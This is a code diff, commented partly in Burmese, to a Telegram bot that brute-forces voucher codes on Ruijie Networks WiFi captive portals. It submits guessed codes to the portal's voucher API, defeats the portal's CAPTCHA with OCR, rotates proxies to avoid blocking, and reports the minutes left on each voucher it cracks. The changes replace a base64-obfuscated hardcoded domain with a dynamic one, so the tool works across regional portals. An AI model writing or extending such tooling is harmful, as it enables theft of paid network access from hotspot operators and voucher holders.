@@ -1,5 +1,6 @@
 import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid, aiofiles
 import logging
+import urllib.parse
 from telebot.async_telebot import AsyncTeleBot
 from telebot import types
 from aiohttp import web
@@ -90,6 +91,22 @@ SUCCESS_CODE = asyncio.Queue()
 _auth_cache = {}
 _auth_cache_time = 0
 AUTH_CACHE_TTL = 30
+
+
+# ==================== HELPER: EXTRACT DOMAIN ====================
+def extract_portal_domain(session_url):
+    """
+    Session URL ကနေ domain ကို ဆွဲထုတ်
+    ဥပမာ: https://portal-mm-as.ruijienetworks.com/... → portal-mm-as.ruijienetworks.com
+    """
+    try:
+        parsed = urllib.parse.urlparse(session_url)
+        domain = parsed.netloc
+        if domain:
+            return domain
+    except Exception as e:
+        logger.warning(f"Domain extract error: {e}")
+    return "portal-as.ruijienetworks.com"  # fallback
 
 
 # ==================== WEB SERVER ====================
@@ -488,9 +505,9 @@ async def callback_query(call):
 
     elif data == "input_url":
         try:
-            await bot.edit_message_text("📝 Please send your Session URL\n\nExample: /input https://portal-as.ruijienetworks.com/api/...", chat_id=chat_id, message_id=message_id)
+            await bot.edit_message_text("📝 Please send your Session URL\n\nExample: /input https://portal-mm-as.ruijienetworks.com/api/...", chat_id=chat_id, message_id=message_id)
         except Exception:
-            await bot.send_message(chat_id, "📝 Please send your Session URL\n\nExample: /input https://portal-as.ruijienetworks.com/api/...")
+            await bot.send_message(chat_id, "📝 Please send your Session URL\n\nExample: /input https://portal-mm-as.ruijienetworks.com/api/...")
         await bot.answer_callback_query(call.id)
         return
 
@@ -889,10 +906,17 @@ async def save_rechecked_codes(chat_id_str, recheck_list):
     await save_result()
 
 
-# ==================== SESSION CHECK ====================
+# ==================== SESSION CHECK (FIXED) ====================
 async def check_session_url(session_url):
-    if not session_url or "portal-as.ruijienetworks.com" not in session_url:
+    """
+    ✅ FIXED: မည်သည့် Ruijie portal (portal-as, portal-mm-as, etc.) ကိုမဆို လက်ခံ
+    """
+    if not session_url:
         return False
+    # Accept any ruijienetworks.com domain
+    if "ruijienetworks.com" not in session_url:
+        return False
+
     headers = {
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/148.0.0.0 Safari/537.36',
@@ -904,12 +928,20 @@ async def check_session_url(session_url):
             async with aiohttp.ClientSession(connector=connector, timeout=timeout) as temp_session:
                 async with temp_session.get(session_url, allow_redirects=True, headers=headers) as response:
                     text_ = str(response.url)
-                    if "sessionId" in text_:
-                        return True
-                    if response.status == 200:
+                    body = ""
+                    try:
                         body = await response.text()
-                        if "sessionId" in body or "portal" in body.lower():
-                            return True
+                    except Exception:
+                        pass
+                    # sessionId ရှိရင် valid
+                    if "sessionId" in text_ or "sessionId" in body:
+                        return True
+                    # Portal page ဖြစ်ရင် valid
+                    if response.status == 200 and ("portal" in body.lower() or "ruijie" in body.lower() or "login" in body.lower()):
+                        return True
+                    # Wifidog/stage=portal ဖြစ်ရင်လည်း valid (redirect ဖြစ်နိုင်)
+                    if "stage=portal" in text_ or "stage=portal" in session_url:
+                        return True
         except Exception as e:
             logger.warning(f"Session check error: {e}")
             if p_url:
@@ -930,6 +962,10 @@ async def handle_input(message):
     await bot.reply_to(message, "Session URL အားစစ်ဆေးနေပါသည်။")
     if await check_session_url(session_url=url):
         user_data[message.chat.id]['session_url'] = url
+        # ✅ Extract and save portal domain
+        user_data[message.chat.id]['portal_domain'] = extract_portal_domain(url)
+        logger.info(f"✅ Session saved. Portal domain: {user_data[message.chat.id]['portal_domain']}")
+
         markup = types.InlineKeyboardMarkup(row_width=2)
         markup.add(
             types.InlineKeyboardButton("🔢 6 Digit Only", callback_data="scan_type_6"),
@@ -943,7 +979,7 @@ async def handle_input(message):
             types.InlineKeyboardButton("🛑 Stop", callback_data="stop_scan"),
             types.InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")
         )
-        await bot.send_message(message.chat.id, "✅ SESSION SAVED\n\nChoose a scan type below:", reply_markup=markup)
+        await bot.send_message(message.chat.id, f"✅ SESSION SAVED\n\nPortal: {user_data[message.chat.id]['portal_domain']}\n\nChoose a scan type below:", reply_markup=markup)
     else:
         await bot.reply_to(message, "❌ Session URL မှားနေပါသည် သို့မဟုတ် Proxy များ ချိတ်ဆက်၍မရပါ။")
 
@@ -1304,14 +1340,14 @@ def replace_mac(url, new_mac):
     return re.sub(r'(?<=mac=)[^&]+', new_mac, url)
 
 
-async def fetch_voucher_balance(session, session_id):
+async def fetch_voucher_balance(session, session_id, portal_domain):
     headers = {
-        'authority': 'portal-as.ruijienetworks.com',
+        'authority': portal_domain,
         'content-type': 'application/json;',
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
     }
     try:
-        url = f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}'
+        url = f'https://{portal_domain}/api/auth/balance/getBalance/{session_id}'
         async with session.get(url, headers=headers) as req:
             respond = await req.json()
             return respond.get('result', {}) or {}
@@ -1319,13 +1355,13 @@ async def fetch_voucher_balance(session, session_id):
         return {}
 
 
-async def fetch_voucher_balance_safe(session_id):
+async def fetch_voucher_balance_safe(session_id, portal_domain):
     for _ in range(3):
         connector, p_url = await get_random_proxy_connector()
         try:
             timeout = aiohttp.ClientTimeout(total=15)
             async with aiohttp.ClientSession(connector=connector, cookie_jar=aiohttp.CookieJar(), timeout=timeout) as balance_session:
-                data = await fetch_voucher_balance(balance_session, session_id)
+                data = await fetch_voucher_balance(balance_session, session_id, portal_domain)
                 return data if isinstance(data, dict) else {}
         except Exception:
             if p_url:
@@ -1335,7 +1371,7 @@ async def fetch_voucher_balance_safe(session_id):
     return {}
 
 
-# ==================== PERFORM CHECK ====================
+# ==================== PERFORM CHECK (FIXED) ====================
 async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
     if not recheck:
         current_task = scan_tasks.get(chat_id)
@@ -1358,9 +1394,9 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                 await bot.send_message(chat_id, f"❌ Limit ({limit}) ပြည့်ပါပြီ။")
                 return
 
-    post_url = base64.b64decode(
-        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
-    ).decode()
+    # ✅ FIXED: Extract portal domain from session URL (dynamic)
+    portal_domain = extract_portal_domain(session_url)
+    post_url = f"https://{portal_domain}/api/auth/voucher/?lang=en_US"
 
     response = None
     session_id = None
@@ -1380,11 +1416,11 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                 auth_code = None
                 for _ in range(4):
                     try:
-                        image = await Captcha_Image(task_session, session_id)
+                        image = await Captcha_Image(task_session, session_id, portal_domain)
                         text = await Captcha_Text(image)
                         if not text:
                             continue
-                        verified = await Varify_Captcha(task_session, session_id, text)
+                        verified = await Varify_Captcha(task_session, session_id, text, portal_domain)
                         if verified:
                             auth_code = text
                             break
@@ -1405,11 +1441,11 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                     "authCode": auth_code,
                 }
                 headers = {
-                    "authority": "portal-as.ruijienetworks.com",
+                    "authority": portal_domain,
                     "accept": "*/*",
                     "content-type": "application/json",
-                    "origin": "https://portal-as.ruijienetworks.com",
-                    "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}",
+                    "origin": f"https://{portal_domain}",
+                    "referer": f"https://{portal_domain}/download/static/maccauth/src/index.html?sessionId={session_id}",
                     "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36",
                 }
                 async with task_session.post(post_url, json=data, headers=headers) as req:
@@ -1437,7 +1473,7 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
         if recheck:
             return code
 
-        balance_data = await fetch_voucher_balance_safe(session_id)
+        balance_data = await fetch_voucher_balance_safe(session_id, portal_domain)
         profile_name = balance_data.get('profileName', 'Unknown')
         total_min = balance_data.get('totalMinutes', 0)
         remain_min = balance_data.get('remainingMinutes', 0)
@@ -1491,7 +1527,7 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                 logger.error(f"Limited Message Error: {e}")
 
 
-# ==================== OCR ====================
+# ==================== OCR / CAPTCHA (FIXED) ====================
 _ocr = ddddocr.DdddOcr(show_ad=False)
 
 
@@ -1512,29 +1548,37 @@ async def Captcha_Text(image_bytes):
     return await asyncio.to_thread(_ocr_sync, image_bytes)
 
 
-async def Captcha_Image(session, session_id):
+async def Captcha_Image(session, session_id, portal_domain="portal-as.ruijienetworks.com"):
+    """
+    ✅ FIXED: Portal domain dynamic
+    """
     headers = {
-        'authority': 'portal-as.ruijienetworks.com',
+        'authority': portal_domain,
         'accept': 'image/*,*/*;q=0.8',
-        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html',
+        'referer': f'https://{portal_domain}/download/static/maccauth/src/index.html',
         'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/139.0.0.0 Safari/537.36',
     }
     params = {'sessionId': session_id, '_t': str(int(time.time() * 1000))}
-    async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
+    url = f'https://{portal_domain}/api/auth/captcha/image'
+    async with session.get(url, params=params, headers=headers) as req:
         return await req.read()
 
 
-async def Varify_Captcha(session, session_id, text):
+async def Varify_Captcha(session, session_id, text, portal_domain="portal-as.ruijienetworks.com"):
+    """
+    ✅ FIXED: Portal domain dynamic
+    """
     headers = {
-        'authority': 'portal-as.ruijienetworks.com',
+        'authority': portal_domain,
         'accept': '*/*',
         'content-type': 'application/json',
-        'origin': 'https://portal-as.ruijienetworks.com',
-        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html',
+        'origin': f'https://{portal_domain}',
+        'referer': f'https://{portal_domain}/download/static/maccauth/src/index.html',
         'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/139.0.0.0 Safari/537.36',
     }
     json_data = {'sessionId': session_id, 'authCode': text}
-    async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
+    url = f'https://{portal_domain}/api/auth/captcha/verify'
+    async with session.post(url, headers=headers, json=json_data) as req:
         data = await req.json()
         success = data.get("success")
         if success is True or str(success).lower() == "true":
